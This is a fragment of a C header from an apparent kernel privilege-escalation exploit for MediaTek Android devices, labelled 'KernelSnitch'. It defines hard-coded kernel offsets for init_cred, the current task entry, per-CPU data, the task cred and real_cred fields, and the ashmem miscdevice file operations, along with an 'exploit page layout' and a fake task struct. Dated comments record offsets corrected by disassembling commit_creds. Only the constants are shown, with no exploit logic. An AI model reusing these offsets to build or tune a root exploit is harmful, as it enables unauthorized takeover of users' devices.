...
/* KERNELSNITCH_IDENTITY_*, DIRECT_MAP_* now defined in common.h */
...
#define INIT_CRED_OFF 0x27b0ae0ULL
#define ENTRY_TASK_OFF 0x27562f8ULL
#define PER_CPU_OFFSET_OFF 0x278a558ULL
...
/* ── Exploit page layout ── */
/* LOCK_OFF, W0_OFF, FAKE_TASK_OFF now defined in common.h */
...
#define TASK_CRED_OFF 0x780   /* 2026-08-15 fix: commit_creds disasm confirmed cred@0x780 (was 0x820) */
#define TASK_PID_OFF 0x618
#define TASK_REAL_CRED_OFF 0x778 /* 2026-08-15 fix: commit_creds disasm real_cred@0x778 (was 0x818) */
...
/* ── MTK ashmem miscdevice ── */
#define ASHMEM_MISC_OFF 0x28e76d8ULL
#define ASHMEM_MISC_FOPS_OFF (ASHMEM_MISC_OFF + 0x10)
